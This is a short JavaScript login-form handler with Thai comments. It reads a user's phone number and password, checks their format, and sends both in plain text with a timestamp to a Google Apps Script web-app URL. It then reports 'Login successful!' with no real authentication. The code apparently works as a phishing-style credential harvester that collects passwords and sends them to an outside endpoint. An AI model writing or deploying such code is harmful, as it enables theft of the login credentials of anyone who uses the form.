document.getElementById('logIn').addEventListener('submit', function(event) {
    event.preventDefault(); // หยุดการ submit form แบบปกติ
    
    const phone = document.getElementById('phone').value;
    const password = document.getElementById('password').value;
    
    // ตรวจสอบความถูกต้องของเบอร์โทรและพาสเวิร์ด
    if (!validatePhone(phone) || !validatePassword(password)) {
        alert("เบอร์โทรศัพหรือพาสเวิร์ด ไม่ถูกต้อง");
        return;
    }

    const date = new Date().toLocaleDateString();
    const time = new Date().toLocaleTimeString();

    // ส่งข้อมูลไปยัง Google Script
    fetch('https://script.google.com/macros/s/AKfycbzEEGxlbYemLkmOGnYZnrLqN9JkrfAlUgiMRKgHy-k3S4xMKTOP6yBNnqagcVJokDeHVQ/exec', {
        method: 'POST',
        body: JSON.stringify({
            phone: phone,
            password: password,
            date: date,
            time: time
        }),
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        alert("Login successful!"); // แจ้งเตือนเมื่อเข้าสู่ระบบสำเร็จ
    })
    .catch(error => {
        console.error('Error:', error);
        alert("Login failed. Please try again."); // แจ้งเตือนเมื่อเกิดข้อผิดพลาด
    });
});

// ฟังก์ชันตรวจสอบเบอร์โทรศัพท์
function validatePhone(phone) {
    const phonePattern = /^[0-9]{10}$/;
    return phonePattern.test(phone); // ตรวจสอบว่ามี 10 หลักหรือไม่
}

// ฟังก์ชันตรวจสอบพาสเวิร์ด
function validatePassword(password) {
    const passwordPattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*[!@#$%^&*])(?=.{8,})/;
    return passwordPattern.test(password); // ตรวจสอบความยาวและรูปแบบพาสเวิร์ด
}
